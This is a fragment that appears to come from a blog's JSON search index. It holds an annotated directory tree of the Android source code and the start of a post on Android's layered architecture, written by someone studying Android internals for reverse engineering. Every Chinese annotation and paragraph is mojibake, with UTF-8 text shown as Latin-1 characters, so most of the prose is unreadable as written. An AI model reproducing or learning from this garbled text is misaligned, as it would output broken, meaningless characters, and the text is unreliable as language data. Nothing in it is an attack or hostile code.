ï¼ˆå¤´æ–‡ä»¶ï¼‰| `-- src ï¼ˆæºç ï¼‰|-- libthread_db ï¼ˆå¤šçº¿ç¨‹ç¨‹åºçš„è°ƒè¯•å™¨åº“ï¼‰| `-- include ï¼ˆå¤´æ–‡ä»¶ï¼‰|-- linker ï¼ˆåŠ¨æ€é“¾æ¥å™¨ï¼‰`-- arch ï¼ˆæ”¯æŒarmå’Œx86ä¸¤ç§æ¶æ„ï¼‰# Android Runtime Core Libraries å¯¹åº”çš„æ˜¯ dalvik/libcore/ Dalvik Virtual Machine å¯¹åº”çš„æ˜¯ dalvik/ |-- dalvikvm ï¼ˆmain.cçš„ç›®å½•ï¼‰|-- dexdump ï¼ˆdexåæ±‡ç¼–ï¼‰|-- dexlist ï¼ˆList all methods in all concrete classes in a DEX file.ï¼‰|-- dexopt ï¼ˆé¢„éªŒè¯ä¸ä¼˜åŒ–ï¼‰|-- docs ï¼ˆæ–‡æ¡£ï¼‰|-- dvz ï¼ˆå’Œzygoteç›¸å…³çš„ä¸€ä¸ªå‘½ä»¤ï¼‰|-- dx ï¼ˆdxå·¥å…·ï¼Œå°†å¤šä¸ªjavaè½¬æ¢ä¸ºdexï¼‰|-- hit ï¼ˆï¼Ÿjavaè¯­è¨€å†™æˆï¼‰|-- libcore ï¼ˆæ ¸å¿ƒåº“ï¼‰|-- libcore-disabled ï¼ˆï¼Ÿç¦ç”¨çš„åº“ï¼‰|-- libdex ï¼ˆdexçš„åº“ï¼‰|-- libnativehelper ï¼ˆSupport functions for Android's class librariesï¼‰|-- tests ï¼ˆæµ‹è¯•ä»£ç ï¼‰|-- tools ï¼ˆå·¥å…·ï¼‰`-- vm ï¼ˆè™šæ‹Ÿæœºå®ç°ï¼‰# HAL å¯¹åº”çš„ç›®å½•ä¸º hardware/ |-- broadcom ï¼ˆåšé€šå…¬å¸ï¼‰| `-- wlan ï¼ˆæ— çº¿ç½‘å¡ï¼‰|-- libhardware ï¼ˆç¡¬ä»¶åº“ï¼‰| |-- include ï¼ˆå¤´æ–‡ä»¶ï¼‰| `-- modules ï¼ˆDefault (and possibly architecture dependents) HAL modulesï¼‰| |-- gralloc ï¼ˆgrallocæ˜¾ç¤ºç›¸å…³ï¼‰| `-- overlay ï¼ˆSkeleton for the \"overlay\" HAL module.ï¼‰|-- libhardware_legacy ï¼ˆæ—§çš„ç¡¬ä»¶åº“ï¼‰| |-- flashlight ï¼ˆèƒŒå…‰ï¼‰| |-- gps ï¼ˆGPSï¼‰| |-- include ï¼ˆå¤´æ–‡ä»¶ï¼‰| |-- mount ï¼ˆæ—§çš„æŒ‚è½½å™¨ï¼‰| |-- power ï¼ˆç”µæºï¼‰| |-- qemu ï¼ˆæ¨¡æ‹Ÿå™¨ï¼‰| |-- qemu_tracing ï¼ˆæ¨¡æ‹Ÿå™¨è·Ÿè¸ªï¼‰| |-- tests ï¼ˆæµ‹è¯•ï¼‰| |-- uevent ï¼ˆueventï¼‰| |-- vibrator ï¼ˆéœ‡åŠ¨ï¼‰| `-- wifi ï¼ˆæ— çº¿ï¼‰|-- msm7k ï¼ˆé«˜é€š7kå¤„ç†å™¨å¼€æºæŠ½è±¡å±‚ï¼‰| |-- boot ï¼ˆå¯åŠ¨ï¼‰| |-- libaudio ï¼ˆå£°éŸ³åº“ï¼‰| |-- libaudio-qsd8k ï¼ˆqsd8kçš„å£°éŸ³ç›¸å…³åº“ï¼‰| |-- libcamera ï¼ˆæ‘„åƒå¤´åº“ï¼‰| |-- libcopybit ï¼ˆcopybitåº“ï¼‰| |-- libgralloc ï¼ˆgrallocåº“ï¼‰| |-- libgralloc-qsd8k ï¼ˆqsd8kçš„grallocåº“ï¼‰| |-- liblights ï¼ˆèƒŒå…‰åº“ï¼‰| `-- librpc ï¼ˆRPCåº“ï¼‰|-- ril ï¼ˆæ— çº¿ç”µæŠ½è±¡å±‚ï¼‰| |-- include ï¼ˆå¤´æ–‡ä»¶ï¼‰| |-- libril ï¼ˆåº“ï¼‰| |-- reference-cdma-sms ï¼ˆcdmaçŸ­ä¿¡å‚è€ƒï¼‰| |-- reference-ril ï¼ˆrilå‚è€ƒï¼‰| `-- rild ï¼ˆrilåå°æœåŠ¡ç¨‹åºï¼‰`-- ti ï¼ˆtiå…¬å¸å¼€æºHALï¼‰ |-- omap3 ï¼ˆomap3å¤„ç†å™¨ï¼‰ | |-- dspbridge ï¼ˆDSPæ¡¥ï¼‰ | |-- libopencorehw ï¼ˆopencoreç¡¬ä»¶åº“ï¼‰ | |-- liboverlay ï¼ˆoverlayç¡¬ä»¶åº“ï¼‰ | |-- libstagefrighthw ï¼ˆstagefrightç¡¬ä»¶åº“ï¼‰ | `-- omx ï¼ˆomxç»„ä»¶ï¼‰ `-- wlan ï¼ˆæ— çº¿ç½‘å¡ï¼‰# å…¶ä»– bootable ç›®å½• |-- bootloader ï¼ˆé€‚åˆå„ç§bootloaderçš„é€šç”¨ä»£ç ï¼‰| `-- legacy ï¼ˆä¼°è®¡ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œå¯ä»¥å‚è€ƒï¼‰| |-- arch_armv6 ï¼ˆV6æ¶æ„ï¼Œå‡ ä¸ªç®€å•çš„æ±‡ç¼–æ–‡ä»¶ï¼‰| |-- arch_msm7k ï¼ˆé«˜é€š7kå¤„ç†å™¨æ¶æ„çš„å‡ ä¸ªåŸºæœ¬é©±åŠ¨ï¼‰| |-- include ï¼ˆé€šç”¨å¤´æ–‡ä»¶å’Œé«˜é€š7kæ¶æ„å¤´æ–‡ä»¶ï¼‰| |-- libboot ï¼ˆå¯åŠ¨åº“ï¼Œéƒ½å†™å¾—å¾ˆç®€å•ï¼‰| |-- libc ï¼ˆä¸€äº›å¸¸ç”¨çš„cå‡½æ•°ï¼‰| |-- nandwrite ï¼ˆnandwirteå‡½æ•°å®ç°ï¼‰| `-- usbloader ï¼ˆusbloaderå®ç°ï¼‰|-- diskinstaller ï¼ˆandroidé•œåƒæ‰“åŒ…å™¨ï¼Œx86å¯ç”Ÿäº§isoï¼‰`-- recovery ï¼ˆç³»ç»Ÿæ¢å¤ç›¸å…³ï¼‰ |-- edify ï¼ˆå‡çº§è„šæœ¬ä½¿ç”¨çš„edifyè„šæœ¬è¯­è¨€ï¼‰ |-- etc ï¼ˆinit.rcæ¢å¤è„šæœ¬ï¼‰ |-- minui ï¼ˆä¸€ä¸ªç®€å•çš„UIï¼‰ |-- minzip ï¼ˆä¸€ä¸ªç®€å•çš„å‹ç¼©å·¥å…·ï¼‰ |-- mtdutils ï¼ˆmtdå·¥å…·ï¼‰ |-- res ï¼ˆèµ„æºï¼‰ | `-- images ï¼ˆä¸€äº›å›¾ç‰‡ï¼‰ |-- tools ï¼ˆå·¥å…·ï¼‰ `-- ota ï¼ˆOTA Over The Air Updateså‡çº§å·¥å…·ï¼‰`-- updater ï¼ˆå‡çº§å™¨ï¼‰build ç›®å½• |-- core ï¼ˆæ ¸å¿ƒç¼–è¯‘è§„åˆ™ï¼‰|-- history ï¼ˆå†å²è®°å½•ï¼‰|-- libs | `-- host ï¼ˆä¸»æœºç«¯åº“ï¼Œæœ‰android â€œcpâ€åŠŸèƒ½æ›¿æ¢ï¼‰|-- target ï¼ˆç›®æ ‡æœºç¼–è¯‘å¯¹è±¡ï¼‰| |-- board ï¼ˆå¼€å‘å¹³å°ï¼‰| | |-- emulator ï¼ˆæ¨¡æ‹Ÿå™¨ï¼‰| | |-- generic ï¼ˆé€šç”¨ï¼‰| | |-- idea6410 ï¼ˆè‡ªå·±æ·»åŠ çš„ï¼‰| | `-- sim ï¼ˆæœ€ç®€å•ï¼‰| `-- product ï¼ˆå¼€å‘å¹³å°å¯¹åº”çš„ç¼–è¯‘è§„åˆ™ï¼‰| `-- security ï¼ˆå¯†é’¥ç›¸å…³ï¼‰`-- tools ï¼ˆç¼–è¯‘ä¸­ä¸»æœºä½¿ç”¨çš„å·¥å…·åŠè„šæœ¬ï¼‰ |-- acp ï¼ˆAndroid \"acp\" Commandï¼‰ |-- apicheck ï¼ˆapiæ£€æŸ¥å·¥å…·ï¼‰ |-- applypatch ï¼ˆè¡¥ä¸å·¥å…·ï¼‰ |-- apriori ï¼ˆé¢„é“¾æ¥å·¥å…·ï¼‰ |-- atree ï¼ˆtreeå·¥å…·ï¼‰ |-- bin2asm ï¼ˆbinè½¬æ¢ä¸ºasmå·¥å…·ï¼‰ |-- check_prereq ï¼ˆæ£€æŸ¥ç¼–è¯‘æ—¶é—´æˆ³å·¥å…·ï¼‰ |-- dexpreopt ï¼ˆæ¨¡æ‹Ÿå™¨ç›¸å…³å·¥å…·ï¼Œå…·ä½“åŠŸèƒ½ä¸æ˜ï¼‰ |-- droiddoc ï¼ˆï¼Ÿä½œç”¨ä¸æ˜ï¼Œjavaè¯­è¨€ï¼Œç½‘ä¸Šæœ‰äººè¯´å’ŒJDK5æœ‰å…³ï¼‰ |-- fs_config ï¼ˆThis program takes a list of files and directoriesï¼‰ |-- fs_get_stats ï¼ˆè·å–æ–‡ä»¶ç³»ç»ŸçŠ¶æ€ï¼‰ |-- iself ï¼ˆåˆ¤æ–­æ˜¯å¦ELFæ ¼å¼ï¼‰ |-- isprelinked ï¼ˆåˆ¤æ–­æ˜¯å¦prelinkedï¼‰ |-- kcm ï¼ˆæŒ‰é”®ç›¸å…³ï¼‰ |-- lsd ï¼ˆList symbol dependenciesï¼‰ |-- releasetools ï¼ˆç”Ÿæˆé•œåƒçš„å·¥å…·åŠè„šæœ¬ï¼‰ |-- rgb2565 ï¼ˆrgbè½¬æ¢ä¸º565ï¼‰ |-- signapk ï¼ˆapkç­¾åå·¥å…·ï¼‰ |-- soslim ï¼ˆstripå·¥å…·ï¼‰`-- zipalign ï¼ˆzip archive alignment toolï¼‰development ç›®å½• |-- apps ï¼ˆä¸€äº›æ ¸å¿ƒåº”ç”¨ç¨‹åºï¼‰| |-- BluetoothDebug ï¼ˆè“ç‰™è°ƒè¯•ç¨‹åºï¼‰| |-- CustomLocale ï¼ˆè‡ªå®šä¹‰åŒºåŸŸè®¾ç½®ï¼‰| |-- Development ï¼ˆå¼€å‘ï¼‰| |-- Fallback ï¼ˆå’Œè¯­è¨€ç›¸å…³çš„ä¸€ä¸ªç¨‹åºï¼‰| |-- FontLab ï¼ˆå­—åº“ï¼‰| |-- GestureBuilder ï¼ˆæ‰‹åŠ¿åŠ¨ä½œï¼‰| |-- NinePatchLab ï¼ˆï¼Ÿï¼‰| |-- OBJViewer ï¼ˆOBJæŸ¥çœ‹å™¨ï¼‰| |-- SdkSetup ï¼ˆSDKå®‰è£…å™¨ï¼‰| |-- SpareParts ï¼ˆé«˜çº§è®¾ç½®ï¼‰| |-- Term ï¼ˆè¿œç¨‹ç™»å½•ï¼‰| `-- launchperf ï¼ˆï¼Ÿï¼‰|-- build ï¼ˆç¼–è¯‘è„šæœ¬æ¨¡æ¿ï¼‰|-- cmds ï¼ˆæœ‰ä¸ªmonkeyå·¥å…·ï¼‰|-- data ï¼ˆé…ç½®æ•°æ®ï¼‰|-- docs ï¼ˆæ–‡æ¡£ï¼‰|-- host ï¼ˆä¸»æœºç«¯USBé©±åŠ¨ç­‰ï¼‰|-- ide ï¼ˆé›†æˆå¼€å‘ç¯å¢ƒï¼‰|-- ndk ï¼ˆæœ¬åœ°å¼€å‘å¥—ä»¶â€”â€”cè¯­è¨€å¼€å‘å¥—ä»¶ï¼‰|-- pdk ï¼ˆPlug Development Kitï¼‰|-- samples ï¼ˆä¾‹ç¨‹ï¼‰| |-- AliasActivity ï¼ˆï¼Ÿï¼‰| |-- ApiDemos ï¼ˆAPIæ¼”ç¤ºç¨‹åºï¼‰| |-- BluetoothChat ï¼ˆè“ç‰™èŠå¤©ï¼‰| |-- BrowserPlugin ï¼ˆæµè§ˆå™¨æ’ä»¶ï¼‰| |-- BusinessCard ï¼ˆå•†ä¸šå¡ï¼‰| |-- Compass ï¼ˆæŒ‡å—é’ˆï¼‰| |-- ContactManager ï¼ˆè”ç³»äººç®¡ç†å™¨ï¼‰| |-- CubeLiveWallpaper ï¼ˆåŠ¨æ€å£çº¸çš„ä¸€ä¸ªç®€å•ä¾‹ç¨‹ï¼‰| |-- FixedGridLayout ï¼ˆåƒæ˜¯å¸ƒå±€ï¼‰| |-- GlobalTime ï¼ˆå…¨çƒæ—¶é—´ï¼‰| |-- HelloActivity ï¼ˆHelloï¼‰| |-- Home ï¼ˆHomeï¼‰| |-- JetBoy ï¼ˆjetBoyæ¸¸æˆï¼‰| |-- LunarLander ï¼ˆè²Œä¼¼åˆæ˜¯ä¸€ä¸ªæ¸¸æˆï¼‰| |-- MailSync ï¼ˆé‚®ä»¶åŒæ­¥ï¼‰| |-- MultiResolution ï¼ˆå¤šåˆ†è¾¨ç‡ï¼‰| |-- MySampleRss ï¼ˆRSSï¼‰| |-- NotePad ï¼ˆè®°äº‹æœ¬ï¼‰| |-- RSSReader ï¼ˆRSSé˜…è¯»å™¨ï¼‰| |-- SearchableDictionary ï¼ˆç›®å½•æœç´¢ï¼‰| |-- SimpleJNI ï¼ˆJNIä¾‹ç¨‹ï¼‰| |-- SkeletonApp ï¼ˆç©ºå£³APPï¼‰| |-- Snake ï¼ˆsnakeç¨‹åºï¼‰| |-- SoftKeyboard ï¼ˆè½¯é”®ç›˜ï¼‰| |-- Wiktionary ï¼ˆï¼Ÿç»´åŸºï¼‰| `-- WiktionarySimple ï¼ˆï¼Ÿç»´åŸºä¾‹ç¨‹ï¼‰|-- scripts ï¼ˆè„šæœ¬ï¼‰|-- sdk ï¼ˆsdké…ç½®ï¼‰|-- simulator ï¼ˆï¼Ÿæ¨¡æ‹Ÿå™¨ï¼‰|-- testrunner ï¼ˆï¼Ÿæµ‹è¯•ç”¨ï¼‰`-- tools ï¼ˆä¸€äº›å·¥å…·ï¼‰external ç›®å½• |-- aes ï¼ˆAESåŠ å¯†ï¼‰|-- apache-http ï¼ˆç½‘é¡µæœåŠ¡å™¨ï¼‰|-- astl ï¼ˆASTL (Android STL) is a slimmed-down version of the regular C++ STL.ï¼‰|-- bison ï¼ˆè‡ªåŠ¨ç”Ÿæˆè¯­æ³•åˆ†æå™¨ï¼Œå°†æ— å…³æ–‡æ³•è½¬æ¢æˆCã€C++ï¼‰|-- blktrace ï¼ˆblktrace is a block layer IO tracing mechanismï¼‰|-- bluetooth ï¼ˆè“ç‰™ç›¸å…³ã€åè®®æ ˆï¼‰|-- bsdiff ï¼ˆdiffå·¥å…·ï¼‰|-- bzip2 ï¼ˆå‹ç¼©å·¥å…·ï¼‰|-- clearsilver ï¼ˆhtmlæ¨¡æ¿ç³»ç»Ÿï¼‰|-- dbus ï¼ˆä½å»¶æ—¶ã€ä½å¼€é”€ã€é«˜å¯ç”¨æ€§çš„IPCæœºåˆ¶ï¼‰|-- dhcpcd ï¼ˆDHCPæœåŠ¡ï¼‰|-- dosfstools ï¼ˆDOSæ–‡ä»¶ç³»ç»Ÿå·¥å…·ï¼‰|-- dropbear ï¼ˆSSH2çš„serverï¼‰|-- e2fsprogs ï¼ˆEXT2æ–‡ä»¶ç³»ç»Ÿå·¥å…·ï¼‰|-- elfcopy ï¼ˆå¤åˆ¶ELFçš„å·¥å…·ï¼‰|-- elfutils ï¼ˆELFå·¥å…·ï¼‰|-- embunit ï¼ˆEmbedded Unit Projectï¼‰|-- emma ï¼ˆjavaä»£ç è¦†ç›–ç‡ç»Ÿè®¡å·¥å…·ï¼‰|-- esd ï¼ˆEnlightened Sound Daemonï¼Œå°†å¤šç§éŸ³é¢‘æµæ··åˆåœ¨ä¸€ä¸ªè®¾å¤‡ä¸Šæ’­æ”¾ï¼‰|-- expat ï¼ˆExpat is a stream-oriented XML parser.ï¼‰|-- fdlibm ï¼ˆFDLIBM (Freely Distributable LIBM)ï¼‰|-- freetype ï¼ˆå­—ä½“ï¼‰|-- fsck_msdos ï¼ˆdosæ–‡ä»¶ç³»ç»Ÿæ£€æŸ¥å·¥å…·ï¼‰|-- gdata ï¼ˆgoogleçš„æ— çº¿æ•°æ®ç›¸å…³ï¼‰|-- genext2fs ï¼ˆgenext2fs generates an ext2 filesystem as a normal (non-root) userï¼‰|-- giflib ï¼ˆgifåº“ï¼‰|-- googleclient ï¼ˆgoogleç”¨æˆ·åº“ï¼‰|-- grub ï¼ˆThis is GNU GRUB, the GRand Unified Bootloader.ï¼‰|-- gtest ï¼ˆGoogle C++ Testing Frameworkï¼‰|-- icu4c ï¼ˆICU(International Component for Unicode)åœ¨C/C++ä¸‹çš„ç‰ˆæœ¬ï¼‰|-- ipsec-tools ï¼ˆThis package provides a way to use the native IPsec functionality ï¼‰|-- iptables ï¼ˆé˜²ç«å¢™ï¼‰|-- jdiff ï¼ˆgenerate a report describing the difference between two public Java APIs.ï¼‰|-- jhead ï¼ˆjpegå¤´éƒ¨ä¿¡æ¯å·¥å…·ï¼‰|-- jpeg ï¼ˆjpegåº“ï¼‰|-- junit ï¼ˆJUnitæ˜¯ä¸€ä¸ªJavaè¯­è¨€çš„å•å…ƒæµ‹è¯•æ¡†æ¶ï¼‰|-- kernel-headers ï¼ˆå†…æ ¸çš„ä¸€äº›å¤´æ–‡ä»¶ï¼‰|-- libffi ï¼ˆlibffi is a foreign function interface library.ï¼‰|-- libpcap ï¼ˆç½‘ç»œæ•°æ®åŒ…æ•è·å‡½æ•°ï¼‰|-- libpng ï¼ˆpngåº“ï¼‰|-- libxml2 ï¼ˆxmlè§£æåº“ï¼‰|-- mtpd ï¼ˆä¸€ä¸ªå‘½ä»¤ï¼‰|-- netcat ï¼ˆsimple Unix utility which reads and writes dataacross network connectionsï¼‰|-- netperf ï¼ˆç½‘ç»œæ€§èƒ½æµ‹é‡å·¥å…·ï¼‰|-- neven ï¼ˆçœ‹ä»£ç å’ŒJNIç›¸å…³ï¼‰|-- opencore ï¼ˆå¤šåª’ä½“æ¡†æ¶ï¼‰|-- openssl ï¼ˆSSLåŠ å¯†ç›¸å…³ï¼‰|-- openvpn ï¼ˆVPNå¼€æºåº“ï¼‰|-- oprofile ï¼ˆOProfileæ˜¯Linuxå†…æ ¸æ”¯æŒçš„ä¸€ç§æ€§èƒ½åˆ†ææœºåˆ¶ã€‚ï¼‰|-- ping ï¼ˆpingå‘½ä»¤ï¼‰|-- ppp ï¼ˆpppdæ‹¨å·å‘½ä»¤ï¼Œå¥½åƒè¿˜æ²¡æœ‰chatï¼‰|-- proguard ï¼ˆJava class file shrinker, optimizer, obfuscator, and preverifierï¼‰|-- protobuf ï¼ˆa flexible, efficient, automated mechanism for serializing structured dataï¼‰|-- qemu ï¼ˆarmæ¨¡æ‹Ÿå™¨ï¼‰|-- safe-iop ï¼ˆfunctions for performing safe integer operations ï¼‰|-- skia ï¼ˆskiaå›¾å½¢å¼•æ“ï¼‰|-- sonivox ï¼ˆsole MIDI solution for Google Android Mobile Phone Platformï¼‰|-- speex ï¼ˆSpeexç¼–/è§£ç APIçš„ä½¿ç”¨(libspeex)ï¼‰|-- sqlite ï¼ˆæ•°æ®åº“ï¼‰|-- srec ï¼ˆNuance å…¬å¸æä¾›çš„å¼€æºè¿ç»­éç‰¹å®šäººè¯­éŸ³è¯†åˆ«ï¼‰|-- strace ï¼ˆtraceå·¥å…·ï¼‰|-- svox ï¼ˆEmbedded Text-to-Speechï¼‰|-- tagsoup ï¼ˆTagSoupæ˜¯ä¸€ä¸ªJavaå¼€å‘ç¬¦åˆSAXçš„HTMLè§£æå™¨ï¼‰|-- tcpdump ï¼ˆæŠ“TCPåŒ…çš„è½¯ä»¶ï¼‰|-- tesseract ï¼ˆTesseract Open Source OCR Engine.ï¼‰|-- tinyxml ï¼ˆTinyXml is a simple, small, C++ XML parserï¼‰|-- tremor ï¼ˆI stream and file decoder provides an embeddable,integer-only libraryï¼‰|-- webkit ï¼ˆæµè§ˆå™¨æ ¸å¿ƒï¼‰|-- wpa_supplicant ï¼ˆæ— çº¿ç½‘å¡ç®¡ç†ï¼‰|-- xmlwriter ï¼ˆXML ç¼–è¾‘å·¥å…·ï¼‰|-- yaffs2 ï¼ˆyaffsæ–‡ä»¶ç³»ç»Ÿï¼‰`-- zlib ï¼ˆa general purpose data compression libraryï¼‰prebuilt ç›®å½• |-- android-arm ï¼ˆarm-androidç›¸å…³ï¼‰| |-- gdbserver ï¼ˆgdbè°ƒè¯•å™¨ï¼‰system ç›®å½• |-- Bluetooth ï¼ˆè“ç‰™ç›¸å…³ï¼‰|-- core ï¼ˆç³»ç»Ÿæ ¸å¿ƒå·¥å…·ç›’æ¥å£ï¼‰| |-- adb ï¼ˆadbè°ƒè¯•å·¥å…·ï¼‰| |-- cpio ï¼ˆcpioå·¥å…·ï¼Œåˆ›å»ºimgï¼‰| |-- debuggerd ï¼ˆè°ƒè¯•å·¥å…·ï¼‰| |-- fastboot ï¼ˆå¿«é€Ÿå¯åŠ¨ç›¸å…³ï¼‰| |-- include ï¼ˆç³»ç»Ÿæ¥å£å¤´æ–‡ä»¶ï¼‰| |-- init ï¼ˆinitç¨‹åºæºä»£ç ï¼‰| |-- libacc ï¼ˆè½»é‡çº§Cç¼–è¯‘å™¨ï¼‰| |-- libctest ï¼ˆlibcæµ‹è¯•ç›¸å…³ï¼‰| |-- libcutils ï¼ˆlibcå·¥å…·ï¼‰| |-- liblog ï¼ˆlogåº“ï¼‰| |-- libmincrypt ï¼ˆåŠ å¯†åº“ï¼‰| |-- libnetutils ï¼ˆç½‘ç»œå·¥å…·åº“ï¼‰| |-- libpixelflinger ï¼ˆå›¾å½¢å¤„ç†åº“ï¼‰| |-- libsysutils ï¼ˆç³»ç»Ÿå·¥å…·åº“ï¼‰| |-- libzipfile ï¼ˆzipåº“ï¼‰| |-- logcat ï¼ˆæŸ¥çœ‹logå·¥å…·ï¼‰| |-- logwrapper ï¼ˆlogå°è£…å·¥å…·ï¼‰| |-- mkbootimg ï¼ˆåˆ¶ä½œå¯åŠ¨boot.imgçš„å·¥å…·ç›’è„šæœ¬ï¼‰| |-- netcfg ï¼ˆç½‘ç»œé…ç½®netcfgæºç ï¼‰| |-- nexus ï¼ˆgoogleæœ€æ–°æ‰‹æœºçš„ä»£ç ï¼‰| |-- rootdir ï¼ˆrootfsï¼ŒåŒ…å«ä¸€äº›etcä¸‹çš„è„šæœ¬å’Œé…ç½®ï¼‰| |-- sh ï¼ˆshellä»£ç ï¼‰| |-- toolbox ï¼ˆtoolboxï¼Œç±»ä¼¼busyboxçš„å·¥å…·é›†ï¼‰| `-- vold ï¼ˆSDå¡ç®¡ç†å™¨ï¼‰|-- extras ï¼ˆé¢å¤–å·¥å…·ï¼‰| |-- latencytop ï¼ˆa tool for software developers ï¼Œidentifying system latency happenï¼‰| |-- libpagemap ï¼ˆpagemapåº“ï¼‰| |-- librank ï¼ˆJava Library Ranking Systemåº“ï¼‰| |-- procmem ï¼ˆpagemapç›¸å…³ï¼‰| |-- procrank ï¼ˆJava Library Ranking Systemç›¸å…³ï¼‰| |-- showmap ï¼ˆshowmapå·¥å…·ï¼‰| |-- showslab ï¼ˆshowslabå·¥å…·ï¼‰| |-- sound ï¼ˆå£°éŸ³ç›¸å…³ï¼‰| |-- su ï¼ˆsuå‘½ä»¤æºç ï¼‰| |-- tests ï¼ˆä¸€äº›æµ‹è¯•å·¥å…·ï¼‰| `-- timeinfo ï¼ˆæ—¶åŒºç›¸å…³ï¼‰`-- wlan ï¼ˆæ— çº¿ç›¸å…³ï¼‰vendor ç›®å½• |-- aosp ï¼ˆandroid open source projectï¼‰| `-- products ï¼ˆä¸€äº›æ¿çº§è§„åˆ™ï¼‰|-- htc ï¼ˆHTCå…¬å¸ï¼‰| |-- common-open ï¼ˆé€šç”¨éƒ¨åˆ†ï¼‰| | `-- akmd ï¼ˆè§£å‹imgç”¨çš„å·¥å…·ï¼‰| |-- dream-open ï¼ˆG1å¼€æ”¾éƒ¨åˆ†ï¼‰| |-- prebuilt-open ï¼ˆé¢„ç¼–è¯‘å¼€æ”¾éƒ¨åˆ†ï¼‰| `-- sapphire-open ï¼ˆsapphireè¿™æ¬¾å‹å·å¼€æ”¾å†…å®¹ï¼‰|-- pv-open ï¼ˆæ²¡ä¸œè¥¿ï¼‰|-- qcom ï¼ˆé‡Œé¢åŸºæœ¬æ˜¯ç©ºçš„ï¼‰`-- sample ï¼ˆgoogleæä¾›çš„æ ·ä¾‹ï¼‰ |-- apps ï¼ˆåº”ç”¨ï¼‰ | |-- client ï¼ˆç”¨æˆ·ï¼‰ | `-- upgrade ï¼ˆå‡çº§ï¼‰ |-- frameworks ï¼ˆæ¡†æ¶ï¼‰ | `-- PlatformLibrary ï¼ˆå¹³å°åº“ï¼‰ |-- products ï¼ˆäº§å“ï¼‰ |-- sdk_addon ï¼ˆsdkæ·»åŠ éƒ¨åˆ†ï¼‰ `-- skins ï¼ˆçš®è‚¤ï¼‰ `-- WVGAMedDpi ï¼ˆWVGAé€‚ç”¨çš„å›¾ç‰‡ï¼‰# å‚è€ƒèµ„æ–™ Android ç³»ç»Ÿæºç ç›®å½•ç»“æ„è¯¦è§£","categories":[],"tags":[]},{"title":"å®‰å“ç³»ç»Ÿæ¶æ„æ¦‚è§ˆ","slug":"android-system-architecture","date":"2023-10-09T01:53:07.000Z","updated":"2023-10-09T03:44:56.163Z","comments":true,"path":"android-system-architecture/","link":"","permalink":"https://oacia.dev/android-system-architecture/","excerpt":"","text":"è¿™ä¸¤å¤©å’Œ 360 åŠ å›ºæŠ—è¡¡äº†å¾ˆä¹…ï¼Œçªç„¶å‘ç°è‡ªå·±ç°åœ¨çš„æ°´å¹³æˆ–è®¸è¿˜æ— æ³•æå®š 360 åŠ å›ºï¼Œæ™šä¸Šç¡è§‰çš„æ—¶å€™æ€è€ƒäº†ä¸€ä¸‹ï¼Œå‘ç°åŸå› åœ¨äºè‡ªå·±å¯¹äºå®‰å“è¿˜æ²¡æœ‰æŒæ¡ï¼Œç”šè‡³è¿ç†Ÿæ‚‰éƒ½ç®—ä¸ä¸Šã€‚ä»¥å¾€å­¦é€†å‘çš„è¿‡ç¨‹ä¸­æ€»æµä¼ ç€ä¸€å¥è¯ï¼šè¦æƒ³é€†å‘åšçš„å¥½ï¼Œæ­£å‘å¿…é¡»å¾—ç²¾é€šã€‚æˆ‘ç°åœ¨è¿å®‰å“é‡Œé¢æœ‰ä»€ä¹ˆéƒ½ä¸çŸ¥é“ï¼Œé‚£è¿˜æ€ä¹ˆå»æå®‰å“é€†å‘å‘¢ï¼Ÿæ‰€ä»¥è¿™ä¸¤ä¸ªæœˆï¼Œæˆ‘è¦é™ä¸‹å¿ƒæ¥ï¼Œå¥½å¥½å­¦ä¹ å®‰å“çš„æ¶æ„åŸºæœ¬ç»„ä»¶å’ŒåŸºæœ¬çš„æœºåˆ¶ï¼ŒæŠŠæ­£å‘çš„åŸºç¡€æ‰“æ‰å®ï¼ æˆ‘å‡†å¤‡ç”¨è‡ªåº•å‘ä¸Šçš„æ–¹æ³•æ¥å­¦ä¹ å®‰å“ç³»ç»Ÿï¼Œä»å†…æ ¸å¼€å§‹å­¦èµ·ï¼Œå› ä¸ºä¸Šå±‚çš„è®¸å¤šæ¨¡å—éƒ½æ˜¯åŸºäºä¸‹å±‚çš„ï¼Œå€˜è‹¥ç›´æ¥ä»ä¸Šå±‚å¼€å§‹å­¦èµ·ï¼Œé‚£è‚¯å®šä¼šé‡åˆ°è®¸å¤šä¸‹å±‚çš„æ¨¡å—å¯¼è‡´ä¸€æ—¶ä¹‹é—´æ‘¸ä¸ç€å¤´è„‘. # å®‰å“ç³»ç»Ÿæ•´ä½“æ¶æ„ è¿™å¼ å›¾å¾ˆæ¸…æ™°çš„æè¿°äº†å®‰å“çš„æ•´ä½“æ¶æ„ï¼Œä»ä¸Šåˆ°ä¸‹å…±æœ‰äº”å±‚ Android æ˜¯åŸºäº Linux å†…æ ¸çš„ï¼Œä»å¹¿ä¹‰çš„è§’åº¦è¯´ï¼Œå®ƒå¯ä»¥åˆ†ä¸º Linux å†…æ ¸å±‚å’Œç”¨æˆ·ç©ºé—´å±‚ # Linux å†…æ ¸å±‚ Android ç³»ç»Ÿæ˜¯åŸºäº Linux å†…æ ¸çš„ï¼Œè¿™ä¸€å±‚ä¸º Android è®¾å¤‡çš„å„ç§ç¡¬ä»¶æä¾›äº†åº•å±‚çš„é©±åŠ¨ï¼Œç®¡ç†åº•å±‚é©±åŠ¨ç¨‹åºï¼Œç”¨äºå’Œè®¾å¤‡ç¡¬ä»¶ç›´æ¥äº¤äº’ï¼Œé™¤äº† Linux å†…æ ¸çš„è¿›ç¨‹ã€å†…å­˜ç®¡ç†ç­‰ï¼Œè¿˜åŒ…å« Android æ·»åŠ çš„ç‰¹è‰²é©±åŠ¨ç¨‹åº Binder , Logger å’Œ Ashmem Android å¯¹äº Linux è¿›è¡Œäº†æ”¹åŠ¨ï¼Œæ¯”å¦‚å®ƒæ²¡æœ‰ glibc ï¼Œæœ€åˆä¸€äº›ä¾¿æºçš„ç§»åŠ¨è®¾å¤‡å¹¶æ²¡æœ‰é‡‡ç”¨ glibc ä½œä¸º c åº“ï¼Œè€Œæ˜¯ google è‡ªå·±å¼€å‘çš„ Bionic Libc æ¥ä½œä¸ºä»£æ›¿å“ï¼Œä¹Ÿå¹¶æ²¡æœ‰å®Œå…¨ç…§æ¬ Linux ç³»ç»Ÿçš„å†…æ ¸è¿˜å¢åŠ äº† Gold-Fish å¹³å°ä»¥åŠ yaffs2 Flash æ–‡ä»¶ç³»ç»Ÿ. å®‰å“é©±åŠ¨æ¦‚è¿°å¦‚ä¸‹ Binder IPC é©±åŠ¨ï¼šåŸºäº OpenBinder æ¡†æ¶çš„ä¸€ä¸ªé©±åŠ¨ï¼Œç”¨äºæä¾› Android 